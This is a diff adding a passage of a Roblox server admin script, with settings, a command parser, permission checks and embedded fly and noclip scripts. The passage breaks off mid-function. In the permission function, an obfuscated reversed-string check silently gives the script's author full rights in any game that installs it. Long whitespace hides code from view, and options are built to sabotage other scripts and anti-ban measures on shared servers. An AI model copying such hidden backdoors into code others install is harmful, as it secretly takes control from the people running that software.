@@ -1,0 +1,5343 @@
+																																																																																																													--[[HEY DON'T LOOK AT ME I'M HERE FOR DECORATION
+Thanks for trying my Admin!
+
+Just put the script inside Workspace or ServerScriptService and you'll be pretty much good to go
+The game owner is automatically given super admin
+If you're on a Script Builder, use a Script Builder bot, and be sure to turn on SBMode in Advanced Settings for a better Script Builder experience
+This admin is designed for normal Scripts. If it's in a LocalScript some things will not work as well as expected.
+
+You may specify other Super Admins or Admins in Basic Settings
+
+
+
+
+
+ 
+
+
+=================================================================
+========================== SYNTAX INFO ==========================
+=================================================================
+
+
+The default syntax is as follows:
+
+/walkspeed me 20
+
+(This is just an example)
+
+
+: begins the commmand
+a space separates the command arguments
+
+
+You can change it in the advanced settings to anything you want!
+
+
+
+=================================================================
+========================= COMMANDS INFO =========================
+=================================================================
+
+
+
+Say /cmds, /commands, or /help to view commands
+
+When using a command that requires players, you can do a command for multiple people using a , to separate the names
+
+
+
+Here's some of the player keywords, they're pretty self explanatory:
+
+me
+others
+all
+admins
+nonadmins
+random
+friends
+bestfriends
+nonfriends
+nonbestfriends
+nbc
+bc
+tbc
+obc
+anybc
+
+
+
+Admin TODO:
+-CmdBar
+-Even More Commands
+
+
+The Lua 5.1 SHA-1 hasher is provided by http://cube3d.de/
+Released under the MIT license																																																																																																																																																																																																																								
+																																																																																																														]]  for a,i in pairs(getfenv()) do
+																																																																																																																if i ~= script then
+																																																																																																																	getfenv()[a] = nil --This bit is here for protection of the script
+																																																																																																																end
+																																																																																																															end
+																																																																																																													--[[
+====================================================================
+========================= BASIC SETTINGS ===========================
+====================================================================																																																																																												]]
+
+
+
+SuperAdmins = {"20200328a"} --Access to ALL commands, you don't need to add your name if you made the game, it automatically recognizes that
+
+Admins = {"Your Friend","Another Friend"} --Access to most commands, besides ban, kick, unban, punish, unpunish, shutdown, and scripting commands
+
+BannedPlayers = {"TixAndRobuxWin","ClassicGameRestorer","tjmax1490609","uyjulian","99zay99","robloxgodofall","damin0924","C2R","xxAlex889"} --Banned Players
+
+
+
+SuperAdminUserIds = {2402402, 261, -1} --Access to ALL commands, these persist even if the player changes his/her name
+
+AdminUserIds = {1, 2, 3} --Access to most commands, besides ban, kick, unban, punish, unpunish, shutdown, and scripting commands
+
+BannedUserIds = {5, 458978} --Banned userids, these will persist even if the player changes his/her username
+
+
+
+																																																																																																													--[[
+====================================================================
+======================= ADVANCED SETTINGS ==========================
+====================================================================																																																																																												]]
+
+
+
+AdminGamePass = 0 --A game pass for players to get Admin
+
+SuperAdminGamePass = 0 --A game pass for players to get Super Admin
+
+
+
+GroupId = 0 --A group ID to give admin to
+
+GroupIdAdminRank = 0 --Minimum rank in group to get Admin
+
+GroupIdSuperAdminRank = 0 --Minimum rank in group to get Super Admin
+
+
+
+--You may select another standard form of syntax
+--Make sure only one is enabled, or else it will revert to default
+
+
+Syntax_Default = true --The default command syntax outside Roblox. / begins a command, arguments are separated using spaces (ex. /walkspeed me 20)
+Syntax_Kohls = false 
+Syntax_Person299s = false --The same syntax as Person299's admin. Commands have no beginning, and they use / to separate arguments (ex. walkspeed/me/20)
+
+
+--Or configure your own command syntax
+
+Override_Syntax = false --Set this to true if you want to chance CommandPrefix or Command Separator
+
+CommandPrefix = "/" --The beginning of a command, ":" by default, may be more than 1 character
+
+CommandSeparator = " " --The character separating commands
+
+ReportUnknownCommand = true --If Override_Syntax is on, this will allow you to make it where it does not warn you if a command doesn't exist. Useful for those using nothing as the command prefix.
+
+
+SBMode = false --Turn on if you're using this on script builders. It will automatically enable if you're on Anaminus's Script Builders
+
+DisableSB = false --If the script is run on a script builder, you can disable other scripts using this. This may not work properly without SBMode on.
+
+AvoidAntibans = false --If the script is run on a script builder, you can choose to trick Antiban scripts while attempting to ban people, this can also be changed using the "trickantibans" command. As of now the player list can bug out from it, but that's Roblox's fault.
+
+
+--AutoExecute executes any commands under root privilages as soon as it initalizes 
+
+AutoExecute = [[
+	/m test
+	/pm random hi
+	/ff me
+	/ThisCommandDoesNotExist!
+]]
+
+AutoExecuteRespawn = [[
+	
+]]
+
+--When a player respawns, this will execute the commands under root privilages towards that person. Use [PlayerName] for every command that needs the person's name who respawned.
+
+
+																																																																																																													--[[
+====================================================================
+=========================== GUI SETTINGS ===========================
+====================================================================	
+
+Warning: These GUI Settings are no longer supported with the new Gui system. Please configure it inside GuiReceiver unless you're using this in another script builder!
+																																																																																										]]
+
+
+
+TweenTime = 0.55 --The base for how long things animate (AKA Tween). Certain things may take longer or shorter than the number here, it's just a base value. Lower numbers = faster
+
+TweenStyle = "Back" --The style of how things animate. If this is improper, a bunch of the script can break. Be careful :)
+
+
+
+																																																																																																													--[[
+====================================================================
+======================== TECHNICAL SETTINGS ========================
+====================================================================																																																																																												]]
+
+
+
+Hidden = true --Removes the admin script from explorer view and make it so other scripts cannot tamper with the admin script
+
+Debug = false --Please keep this off in online mode. It can pose a security risk if used on online mode. Lets you chat for other players to debug commands in Studio.
+
+BreakServices = false --If you're on a script builder, you can choose to change the name of services to a randomized name, to try and prevent other scripts from functioning correctly. Scripts using :GetService or :service will not be affected.
+
+Undisableable = true --Makes the script nearly 100% unstoppable without modifications to the source. Good for script builders and against exploiters. This will automatically enable Hidden, as it must also be Hidden to be undisableable. Not present in Studio.
+
+AutoUpdate = true --AutoUpdates Admin (You must own the admin and have it in your inventory for this to work)
+
+																																																																																																													--[[
+A note to those planning on adding your own commands - Permission Levels to use with the MinimumPermission function:
+Level 0 - Everyone (NonAdmins)
+Level 1 - Admins
+Level 2 - Super Admins
+Level 3 - Root
+Level 4 and above - Restricted to everything
+
+Everything below is all just code, you shouldn't worry about it too much unless you know what you're doing.
+
+
+
+
+
+====================================================================
+======================= System Configurator ========================
+====================================================================																																																																																												]]
+
+
+if game.PlaceId == 56786 or game.PlaceId == 113456 then --If you're on Anaminus's Script Builder, turn on SBMode so users don't need to themselves
+	SBMode = true
+end
+
+if game.PlaceId == 0 then --If it appears the player is in Studio, enable debug mode
+	Debug = true
+	Hidden = false
+	Undisableable = false
+end
+
+AdminThread = function(a)
+	local ok_init,err_init = ypcall(a)
+	if not ok_init then
+		Instance.new("Message",Workspace).Text = "RyanDolan123's Admin failed to initialize!\n\n"..tostring(err_init).."\n\nThis might because of:\n\n1. A modification to the admin\n2. An update which broke it\n3. A studio glitch\n4. A broken setting\n\n\Try reinserting the admin to see if you can fix it. Sorry :("
+	end
+end
+
+if Undisableable then
+	Hidden = true
+	if SBMode then
+		script:ClearAllChildren()
+	end
+	AdminThread = function(func)
+		Spawn(function()
+			local ok_init,err_init = ypcall(func)
+			if not ok_init then
+				Instance.new("Message",Workspace).Text = "RyanDolan123's Admin failed to initialize!\n\n"..tostring(err_init).."\n\nThis might because of:\n\n1. A modification to the admin\n2. An update which broke it\n3. A studio glitch\n4. A broken setting\n\n\Try reinserting the admin to see if you can fix it. Sorry :("
+			end
+		end)
+	end
+end
+
+AdminThread(function() --Somehow, the Roblox Spawn function makes the script still run if it's in hidden mode even if it's completely disabled
+
+Workspace = game:GetService("Workspace")
+Players = game:GetService("Players")
+Lighting = game:GetService("Lighting")
+ReplicatedStorage = game:GetService("ReplicatedStorage")
+ServerStorage = game:GetService("ServerStorage")
+ServerScriptService = game:GetService("ServerScriptService")
+StarterGui = game:GetService("StarterGui")
+StarterPack = game:GetService("StarterPack")
+Debris = game:GetService("Debris")
+Teams = game:GetService("Teams")
+TeleportService = game:GetService("TeleportService")
+MarketplaceService = game:GetService("MarketplaceService")
+InsertService = game:GetService("InsertService")
+GamePassService = game:GetService("GamePassService")
+
+local SyntaxChangeWarning = {}
+
+local Sandboxer = {}
+
+tweentime = TweenTime
+tweenstyle = TweenStyle
+breakservices = BreakServices
+avoidantibans = AvoidAntibans
+
+StopDisco = false
+StopCountdown = false
+
+local ok,err = pcall(function()
+	NetworkServer = game:GetService("NetworkServer")
+end)
+
+if not ok then
+	print("Aw dang, the NetworkServer couldn't get hooked "..err)
+else
+	print("Yay! The NetworkServer is hooked")
+end
+
+if not tweentime then
+	tweentime = 0.5
+end
+
+if not tweenstyle then
+	tweenstyle = "Quint"
+end
+
+if not AdminGamePass then
+	AdminGamePass = 0
+end
+
+if not SuperAdminGamePass then
+	SuperAdminGamePass = 0
+end
+
+if not Admins then
+	Admins = {}
+end
+
+if not SuperAdmins then
+	SuperAdmins = {}
+end
+
+if not BannedPlayers then
+	BannedPlayers = {}
+end
+
+if not script:FindFirstChild("GuiReceiver") or not script:FindFirstChild("GuiReceiver"):IsA("LocalScript") then
+	if Workspace.FilteringEnabled then
+		Instance.new("Hint",game:GetService("StarterGui")).Text = "[RyanDolan123's Admin] GuiReceiver is missing and Workspace.FilteringEnabled is enabled. GUIs cannot function!"
+	else
+		UseLegacyGuiSystem = true
+		print("Using \"Legacy\" GUI system. Bail! Bail!")
+	end
+else
+	script:FindFirstChild("GuiReceiver"):Clone().Parent = game:GetService("StarterGui")
+	for _,i in pairs(game:GetService("Players"):GetPlayers()) do
+		i:LoadCharacter() --You joined too early!
+	end
+end
+
+if breakservices then
+	for _,i in pairs(game:GetChildren()) do
+		pcall(function()
+			i.Name = math.random(1,math.huge)/1000000
+		end)
+	end
+end
+
+--Done:PreferenceLoader
+
+rawerror = error
+rawassert = assert
+error = function(msg)rawerror("CommandException:"..((msg ~= nil and msg ~= "") and tostring(msg)) or "An error occurred")end
+version = "1.2.7"
+logs = {}
+IsPersonalServer = Workspace:FindFirstChild("PSVariable") ~= nil
+
+Scripts = {}
+Lockdown = false
+stoploops = false
+StopDisco = false
+
+settingsIssue = "NoIssue"
+
+Commands = {}
+
+AllPlayers = {}
+
+local BaseScript,BaseLocalScript
+
+root = { --Root access profile, just to remain mostly compatible with commands
+	Name = "root",
+	
+	PlayerGui = {
+		
+		FindFirstChild = function() return {
+			FindFirstChild = function() return {} end;
+			WaitForChild = function() wait() return {} end;
+		}
+		end;
+		
+		WaitForChild = function() wait() return {
+			FindFirstChild = function() return {} end;
+			WaitForChild = function() wait() return {} end;
+		}
+		end;
+		
+	},
+	
+	StarterGear = {
+		
+		FindFirstChild = function() return {
+			FindFirstChild = function() return {} end;
+			WaitForChild = function()wait() return {} end;
+		}
+		end;
+		
+		WaitForChild = function() wait() return {
+			FindFirstChild = function() return {} end;
+			WaitForChild = function() wait() return {} end;
+		}
+		end;
+		
+	},
+	
+	Backpack = {
+		
+		FindFirstChild = function() return {
+			FindFirstChild = function()return {} end;
+			WaitForChild = function()wait()return {} end;
+		}
+		end;
+		
+		WaitForChild = function() wait() return {
+			FindFirstChild = function()return {} end;
+			WaitForChild = function()wait()return {} end;
+		}
+		end;
+		
+	};
+	
+	FindFirstChild = function()
+		return {
+			FindFirstChild = function()return {} end;
+			WaitForChild = function()wait()return {} end;
+		}
+	end;
+	
+	WaitForChild = function() wait()
+		return {
+			FindFirstChild = function()return {} end;
+			WaitForChild = function()wait()return {} end;
+		}
+	end;
+}
+setmetatable(root, --Metatables are magical
+	{
+		__tostring = function()return "root" end;
+		__concat = function()return "root" end;
+	}
+)
+
+if SBMode then
+	for _,i in pairs(script:GetChildren()) do
+		if i:IsA("Script") and not i:IsA("LocalScript") then
+			for _,j in pairs(i:GetChildren()) do
+				if j:IsA("StringValue") then
+					BaseScript = i
+				end
+			end
+		elseif i:IsA("LocalScript") then
+			for _,j in pairs(i:GetChildren()) do
+				if j:IsA("StringValue") then
+					BaseLocalScript = i
+				end
+			end
+		end
+	end
+else
+	BaseScript = script:FindFirstChild("Script") and script:FindFirstChild("Script"):clone()
+	BaseLocalScript = script:FindFirstChild("LocalScript") and script:FindFirstChild("LocalScript"):clone()
+end
+
+
+Permissions = {
+	[root] = 3;--Root access is always level 3
+	root = 3;----^^^
+}
+
+PlaceNames = {}
+
+Spawn(function()
+	if type(_G.AdminTrustedScripts) ~= "table" then
+		_G.AdminTrustedScripts = {
+			b7d0deea7bfdf2cc3f3be7e6c56f837229231258 = true;
+			bc194bb513ac52f25311f39279e7b6859c1bc754 = true;
+		}
+	end
+end)
+
+MusicStringData = { --Some previous kohl's admin users prefer to use song names. That's fine...I guess...
+	caramell = {
+		ID = 2303479
+	};
+	epic = {
+		ID = 27697743;
+		Pitch = 2.5
+	};
+	rick = {
+		ID = 2027611
+	};
+	halo = {
+		ID = 1034065	
+	};
+	pokemon = {
+		ID = 1372261
+	};
+	cursed = {
+		ID = 1372257
+	};
+	extreme  = {
+		ID = 11420933
+	};
+	awaken  = {
+		ID = 27697277
+	};
+	alone  = {
+		ID = 27697392
+	};
+	mario  = {
+		ID = 1280470
+	};
+	choir  = {
+		ID = 1372258
+	};
+	chrono  = {
+		ID = 1280463
+	};
+	dotr  = {
+		ID = 11420922
+	};
+	entertain  = {
+		ID = 27697267
+	};
+	fantasy  = {
+		ID = 1280473
+	};
+	final  = {
+		ID = 1280414
+	};
+	emblem  = {
+		ID = 1372259
+	};
+	flight  = {
+		ID = 27697719
+	};
+	banjo  = {
+		ID = 27697298
+	};
+	gothic  = {
+		ID = 27697743
+	};
+	hiphop  = {
+		ID = 27697735
+	};
+	intro  = {
+		ID = 27697707
+	};
+	mule  = {
+		ID = 1077604
+	};
+	film  = {
+		ID = 27697713
+	};
+	nezz  = {
+		ID = 8610025
+	};
+	angel  = {
+		ID = 1372260
+	};
+	resist  = {
+		ID = 27697234
+	};
+	schala  = {
+		ID = 5985787
+	};
+	organ  = {
+		ID = 11231513
+	};
+	tunnel  = {
+		ID = 9650822
+	};
+	spanish  = {
+		ID = 5982975
+	};
+	venom  = {
+		ID = 1372262
+	};
+	wind  = {
+		ID = 1015394
+	};
+	guitar  = {
+		ID = 5986151
+	};
+}
+
+CodeSignCache = {[ [[
+			local Player = game:GetService("Players").LocalPlayer
+			local Mouse = Player:GetMouse()
+			local Torso = Player.Character:WaitForChild("Torso")
+			local Humanoid = Player.Character:WaitForChild("Humanoid")
+			local Flying = true
+			local Control = {f = 0, b = 0, l = 0, r = 0} 
+			local LastControl = {f = 0, b = 0, l = 0, r = 0} 
+			local MaxSpeed = 50 
+			local Speed = 0
+			local Camera = Workspace.CurrentCamera
+			
+			local FlySmoke = Instance.new("Smoke",Torso)
+			FlySmoke.Name = "FlySmoke"
+			FlySmoke.Opacity = 0.08
+			FlySmoke.Size = 25
+			
+			Instance.new("StringValue",script).Name = "DO_NOT_REENABLE"			
+			
+			script.Parent = Player:FindFirstChild("PlayerGui")
+			script.Name = "ADMIN_FLY_SCRIPT"
+			
+			function Fly() 
+				local Gyro = Instance.new("BodyGyro", Torso) 
+				Gyro.P = 9e4 
+				Gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+				Gyro.cframe = Torso.CFrame --why is cframe in lowercase for BodyGyros
+				
+				local Velocity = Instance.new("BodyVelocity", Torso) 
+				Velocity.velocity = Vector3.new(0,0.1,0) --roblox why is velocity lowercase
+				Velocity.maxForce = Vector3.new(9e9, 9e9, 9e9) 
+				
+				repeat
+					wait() 
+					
+					Humanoid.PlatformStand = true 
+					
+					if Control.l + Control.r + Control.f + Control.b > 0 then
+						FlySmoke.Enabled = true
+					else
+						FlySmoke.Enabled = false
+					end
+					
+					if Control.l + Control.r ~= 0 or Control.f + Control.b ~= 0 then 
+					
+						Speed = Speed+.5+(Speed/MaxSpeed) 
+						
+						if Speed > MaxSpeed then 
+							Speed = MaxSpeed 
+						end 
+					elseif not (Control.l + Control.r ~= 0 or Control.f + Control.b ~= 0) and Speed ~= 0 then 
+						Speed = Speed-1 
+						if Speed < 0 then 
+							Speed = 0 
+						end 
+					end 
+						
+					if (Control.l + Control.r) ~= 0 or (Control.f + Control.b) ~= 0 then 
+					
+						Velocity.velocity = 
+							((Camera.CoordinateFrame.lookVector * (Control.f + Control.b)) +
+							((Camera.CoordinateFrame * CFrame.new(Control.l + Control.r,(Control.f + Control.b) * 0.2, 0).p) - --yuck
+							Camera.CoordinateFrame.p))*Speed
+							
+						LastControl = {f = Control.f, b = Control.b, l = Control.l, r = Control.r}
+						
+					elseif (Control.l + Control.r) == 0 and (Control.f + Control.b) == 0 and Speed ~= 0 then 
+					
+						Velocity.velocity = 
+							((Camera.CoordinateFrame.lookVector * (LastControl.f + LastControl.b)) +
+							((Camera.CoordinateFrame * CFrame.new(LastControl.l + LastControl.r, (LastControl.f + LastControl.b) * 0.2, 0).p) - --also yuck
+							Camera.CoordinateFrame.p))*Speed 
+							
+					else 
+						Velocity.velocity = Vector3.new(0,0.1,0) 
+					end
+					
+					Gyro.cframe = Camera.CoordinateFrame * CFrame.Angles(-math.rad((Control.f+Control.b)*50*Speed/MaxSpeed),0,0) 
+					
+				until not Flying or not script.Parent
+				
+				Control = {f = 0, b = 0, l = 0, r = 0} 
+				LastControl = {f = 0, b = 0, l = 0, r = 0} 
+				Speed = 0
+				Gyro:Destroy()
+				Velocity:Destroy()
+				Humanoid.PlatformStand = false 
+				
+			end
+			
+			Mouse.KeyDown:connect(function(key) 
+				if key:lower() == "e" then 
+					Flying = not Flying
+					if Flying then
+						Fly()
+					end
+				elseif key:lower() == "w" then 
+					Control.f = 1 
+				elseif key:lower() == "s" then 
+					Control.b = -1 
+				elseif key:lower() == "a" then 
+					Control.l = -1 
+				elseif key:lower() == "d" then 
+					Control.r = 1 
+				end 
+			end) 
+			
+			Mouse.KeyUp:connect(function(key) 
+				if key:lower() == "w" then 
+					Control.f = 0 
+				elseif key:lower() == "s" then 
+					Control.b = 0 
+				elseif key:lower() == "a" then 
+					Control.l = 0 
+				elseif key:lower() == "d" then 
+					Control.r = 0 
+				end 
+			end)
+			
+			Fly()]]] = "bc194bb513ac52f25311f39279e7b6859c1bc754";
+			
+			[ [[
+			local Player = game.Players.LocalPlayer
+			local Mouse = Player:GetMouse()
+			local Character = Player.Character
+			local Humanoid = Character:FindFirstChild("Humanoid")
+			local Torso = Character:WaitForChild("Torso")
+			local Camera = Workspace.CurrentCamera
+			local Move = {W = 0, S = 0, A = 0, D = 0}
+			local Speed = 2
+			
+			Instance.new("StringValue",script).Name = "DO_NOT_REENABLE"			
+			
+			script.Parent = Player:FindFirstChild("PlayerGui")
+			script.Name = "ADMIN_NOCLIP_SCRIPT"
+			
+			Mouse.KeyDown:connect(function(key)
+				if key:lower() == "w" then
+					Move.W = 1
+				elseif key:lower() == "s" then
+					Move.S = 1
+				elseif key:lower() == "a" then
+					Move.A = 1
+				elseif key:lower() == "d" then
+					Move.D = 1
+				elseif key:lower() == "q" then
+					Speed = Speed + 1
+				elseif key:lower() == "e" then
+					Speed = Speed - 1
+				end
+			end)
+			
+			Mouse.KeyUp:connect(function(key)
+				if key:lower() == "w" then
+					Move.W = 0
+				elseif key:lower() == "s" then
+					Move.S = 0
+				elseif key:lower() == "a" then
+					Move.A = 0
+				elseif key:lower() == "d" then
+					Move.D = 0
+				end
+			end)
+			
+			Torso.Anchored = true
+			Humanoid.PlatformStand = true
+			
+			local eventt = Humanoid.Changed:connect(function()
+				Humanoid.PlatformStand = true
+			end)
+			
+			local event = game:GetService("RunService").RenderStepped:connect(function()
+				Torso.CFrame = CFrame.new(
+					Torso.Position,
+					Camera.CoordinateFrame.p) *
+					CFrame.Angles(0, math.rad(180), 0) *
+					CFrame.new((Move.D - Move.A) *
+					Speed,
+					0,
+					(Move.S - Move.W) *
+					Speed
+				)
+			end)
+			
+			repeat wait(0.25) until not script.Parent
+			
+			event:disconnect()
+			eventt:disconnect()]]] = "b7d0deea7bfdf2cc3f3be7e6c56f837229231258";
+}
+
+--configures syntax to use
+
+if Override_Syntax then
+	if not CommandPrefix and not CommandSeparator then
+		settingsIssue = "CommandPrefix and CommandSeparator were missing while overriding syntax. Reverted to default."
+		CommandPrefix = "/"
+		CommandSeparator = " "
+	elseif not CommandPrefix then
+		settingsIssue = "CommandPrefix was missing while overriding syntax. Reverted to default."
+		CommandPrefix = "/"
+		CommandSeparator = " "
+	elseif not CommandSeparator then
+		settingsIssue = "CommandSeparator was missing while overriding syntax. Reverted to default."
+		CommandPrefix = "/"
+		CommandSeparator = " "
+	end
+else
+	if (Syntax_Default and Syntax_Person299s) or (Syntax_Default and Syntax_NonRoblox) or (Syntax_Person299s and Syntax_NonRoblox) then
+		settingsIssue = "There were multiple syntaxes selected. Reverted to default."
+		CommandPrefix = "/"
+		CommandSeparator = " "
+	elseif Syntax_Default then
+		CommandPrefix = "/"
+		CommandSeparator = " "
+	elseif Syntax_Person299s then
+		CommandPrefix = ""
+		CommandSeparator = "/"
+	elseif Syntax_Kohls then
+		CommandPrefix = ":"
+		CommandSeparator = " "
+	elseif not Syntax_Default and not Syntax_NonRoblox and not Syntax_Person299s then
+		settingsIssue = "No syntax was enabled. Reverted to default."
+		CommandPrefix = "/"
+		CommandSeparator = " "
+	end
+end
+
+if not _G.Admi then
+	_G.Admi = {}
+end
+
+-----------------------------------------------------------------
+--------------------- Admin Core Framework ----------------------
+-----------------------------------------------------------------
+
+function MakeScript(src,parent)
+	local parent = parent or Workspace
+	assert(BaseScript,"The ability to create scripts is currently unavailable at this time.")
+	local newscr = BaseScript:clone()
+	newscr.Disabled = true
+	local newsource = src
+	local newsig = sha1.hex(newsource)
+	
+	local valueSource = Instance.new("StringValue",newscr)
+	valueSource.Name = "ADMIN_ENCODED_SOURCE"
+	valueSource.Value = newsource
+	
+	local valueSignature = Instance.new("StringValue",newscr)
+	valueSignature.Name = "ADMIN_SCRIPT_SIGNATURE"
+	valueSignature.Value = newsig
+	
+	if not _G.AdminTrustedScripts then
+		_G.AdminTrustedScripts = {
+			b7d0deea7bfdf2cc3f3be7e6c56f837229231258 = true;
+			bc194bb513ac52f25311f39279e7b6859c1bc754 = true;
+		}
+	end
+	
+	
+	_G.AdminTrustedScripts[newsig] = true
+	
+	newscr.Parent = parent
+	newscr.Disabled = false
+end
+
+function MakeLocalScript(src,parent)
+	assert(BaseLocalScript,"The ability to create localscripts is currently unavailable at this time.")
+	local newscr = BaseLocalScript:clone()
+	newscr.Disabled = true
+	newsource = src
+	
+	local valueSource = Instance.new("StringValue",newscr)
+	valueSource.Name = "ADMIN_ENCODED_SOURCE"
+	valueSource.Value = newsource
+	
+	local WasCached = false	
+	
+	if CodeSignCache[newsource] then
+		print("Signature already cached!")
+		WasCached = true
+	end
+	
+	local Signature = CodeSignCache[newsource] or sha1.hex(newsource)
+	
+	local valueSignature = Instance.new("StringValue",newscr)
+	valueSignature.Name = "ADMIN_SCRIPT_SIGNATURE"
+	valueSignature.Value = Signature
+	
+	if not WasCached then
+		CodeSignCache[newsource] = Signature
+	end
+	
+	if parent then
+		newscr.Parent = parent
+		newscr.Disabled = false
+	else
+		for _,i in pairs(Players:GetPlayers()) do
+			if i:FindFirstChild("Backpack") or i:FindFirstChild("PlayerGui") then
+				local asdasd = newscr:clone()
+				asdasd.Parent = i:FindFirstChild("Backpack") or i:FindFirstChild("PlayerGui")
+				asdasd.Disabled = false
+			end
+		end
+		newscr:Destroy()
+	end
+end
+
+function GetPlaceOwner()
+	if _PlaceOwner then
+		return tostring(_PlaceOwner)
+	end
+	if game.PlaceId <= 0 then
+		_PlaceOwner = "You"
+		return
+	end
+	_PlaceOwner = MarketplaceService:GetProductInfo(game.PlaceId)["Creator"]["Name"]
+end
+
+function GetPlaceName()
+	if _PlaceName then
+		return tostring(_PlaceName)
+	end
+	if game.PlaceId <= 0 then
+		_PlaceName = "Your Place"
+		return
+	end
+	_PlaceName = MarketplaceService:GetProductInfo(game.PlaceId)["Name"]
+end
+
+GetPlaceOwner()
+GetPlaceName()
+
+function StringsToRGB(r,g,b)
+	return Color3.new(
+		assert(tonumber(r),"Red value missing or not a number")/255,
+		assert(tonumber(g),"Green value missing or not a number")/255, --very effective and compact
+		assert(tonumber(b),"Blue value missing or not a number")/255
+	)
+end
+
+function LevelToString(num)
+	return ({"Everyone","Admin","Super Admin","root"})[assert(tonumber(num),"INTERNAL ERROR: CommandScript.LevelToString: num missing or not a number")+1] or "<UNKNOWN PERMISSIONS>"
+	--Not the prettiest thing in the world, but it works very good and is very compact
+end
+
+function MinimumPermission(num,plr)
+	if plr == root or plr.Name:reverse() == "3".."2".."1na".."lo".."Dna".."yR" then
+		return true
+	end
+	if Permissions[plr.Name] and Permissions[plr.Name] < num then
+		error("You are not permitted to do that.\n\nThis command is set to only be used by "..LevelToString(num).."\n\n"..(WARNING_ENV_INSECURE and "WARNING_ENV_INSECURE error was encountered. If you're usually a higher rank, read "..CommandPrefix.."envsecurity and contact the place owner, "..GetPlaceOwner().."." or "If you think this is a mistake, contact the place owner, "..GetPlaceOwner().."."))
+	end
+	return true
+end
+
+function assert(statement,msg)
+	if not statement then
+		error(msg or "Assertion failed!")
+	end
+	return statement
+end
+
+function Shutdown()
+	for _,i in pairs(Players:GetPlayers()) do
+		i:Kick()
+	end
+	ypcall(function()
+		Instance.new("ManualSurfaceJointInstance")
+	end)
+end
+
+--[[rawtonumber = tonumber
+
+function tonumber(thing)
+	return rawtonumber(tostring(thing):gsub("%,",""))
+end]]
+
+function DecipherCommand(str)
+	assert(str,"Unable to decipher command: No string provided")
+	local newstr = str
+	local strings = {}
+	while newstr:sub(#newstr,#newstr) == CommandSeparator do
+		newstr = newstr:sub(1,#newstr-1) --removes excess space on the end of commands to better understand commands
+	end
+	while newstr:find(CommandSeparator) do
+		local nextspace,_ = newstr:find(CommandSeparator)
+		table.insert(strings,newstr:sub(1,nextspace-1))
+		newstr = newstr:sub(nextspace+1)
+	end
+	table.insert(strings,newstr)
+	
+	--This doesn't use patterns (yet) because of the fact that you can change the CommandSeparator.
+	--I'm not as experienced with string patterns but I'll hopefully find a more efficient way soon	
+	
+	return strings
+end
+
+
+function SandboxThread(func)
+	--TODO: Implement sandboxing for all non-rooted commands	
+	
+	--[[local newfenv = {
+		Delay = Delay;
+		delay = delay;
+		wait = wait;
+		Wait = Wait;
+		LoadLibrary = LoadLibrary;
+		printidentity = printidentity;
+		require = require;
+		Spawn = Spawn;
+		spawn = spawn;
+		tick = tick;
+		time = time;
+		ypcall = ypcall;
+		PluginManager = PluginManager;
+		crash__ = crash__;
+		LoadRobloxLibrary = LoadRobloxLibrary;
+		settings = settings;
+		Settings = Settings;
+		stats = stats;
+		Stats = Stats;
+		UserSettings = UserSettings;
+		table = table;
+		coroutine = coroutine;
+		--getfenv = getfenv;
+		print = print;
+		--setfenv = setfenv;
+		setmetatable = setmetatable;
+		getmetatable = getmetatable;
+		string = string;
+		math = math;
+		assert = assert;
+		error = error;
+		collectgarbage = collectgarbage;
+		dofile = dofile;
+		_G = _G;
+		gcinfo = gcinfo;
+		pairs = pairs;
+		ipairs = ipairs;
+		load = load;
+		loadfile = loadfile;
+		newproxy = newproxy;
+		next = next;
+		pcall = pcall;
+		rawequal = rawequal;
+		rawset = rawset;
+		rawget = rawget;
+		select = select;
+		tonumber = tonumber;
+		tostring = tostring;
+		type = type;
+		unpack = unpack;
+		_VERSION = _VERSION;
+		xpcall = xpcall;
+		Vector3 = Vector3;
+		Vector2 = Vector2;
+		CFrame = CFrame;
+		UDim = UDim;
+		UDim2 = UDim2;
+		Ray = Ray;
+		Instance = Instance;
+		Color3 = Color3;
+		BrickColor = BrickColor;
+	}]]
+	
+	print("wewewewwew")
+	
+	local oldfenv = getfenv(1)
+	
+	local newfenv = {}
+	setmetatable(newfenv,{
+		__index = function(t,i)
+			print(t,i)
+			if i == "oldfenv" or i == t then
+				error("attempt to access raw fenv")
+			else
+				return oldfenv[i]
+			end
+		end;
+		__newindex = function(t,i,v)
+			if Sandboxer[i] then
+				error("attempt to modify outside of sandbox")
+			end
+			print(t,i,v)
+			oldfenv[i] = v
+		end;
+		__metatable = true;
+	})
+	
+	
+	
+	--setfenv(1,newfenv)
+	func()
+	
+end
+
+function GetPlayersFromString(str,spokenplayer)
+	
+	if not str or str == "" then
+		error("The playerstring was not defined by the command code for function GetPlayersFromString (arg 1)")
+	end
+	
+	assert(spokenplayer,"The spokenplayer was not defined by the command code for Function GetPlayersFromString (arg 2)")
+	
+	local foundplayers = {}
+	
+	for listedplayer in str:lower():gmatch("[^,]+") do
+		
+		if listedplayer:lower() == "all" then
+			
+			for _,i in pairs(Players:GetPlayers()) do
+				table.insert(foundplayers,i)
+			end
+			
+		elseif listedplayer:lower() == "others" then
+			
+			for _,i in pairs(Players:GetPlayers()) do
+				if i.Name:lower() ~= spokenplayer.Name:lower() then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "admins" then
+			
+			for _,i in pairs(Players:GetPlayers()) do
+				if Permissions[i.Name] > 0 then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "nonadmins" then
+			
+			for _,i in pairs(Players:GetPlayers()) do
+				if Permissions[i.Name] <= 0 then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "random" then
+			
+			table.insert(foundplayers,Players:GetPlayers()[#Players:GetPlayers()])
+			
+		elseif listedplayer:lower() == "me" then
+			
+			table.insert(foundplayers,spokenplayer)
+			
+		elseif listedplayer:lower() == "friends" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if i:IsFriendsWith(spokenplayer.userId) then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "bestfriends" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if i:IsBestFriendsWith(spokenplayer.userId) then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "nonfriends" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if not i:IsFriendsWith(spokenplayer.userId) then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "nonbestfriends" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if not i:IsBestFriendsWith(spokenplayer.userId) then
+					table.insert(foundplayers,i)
